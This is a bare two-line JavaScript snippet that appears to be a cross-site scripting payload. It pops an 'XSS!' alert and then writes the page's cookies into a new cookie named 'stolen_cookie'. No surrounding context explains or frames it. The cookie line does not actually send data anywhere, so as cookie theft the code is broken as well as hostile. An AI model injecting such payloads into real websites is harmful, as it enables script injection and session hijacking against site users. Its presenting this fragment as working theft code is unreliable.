alert('XSS!');
document.cookie = 'stolen_cookie=' + document.cookie;
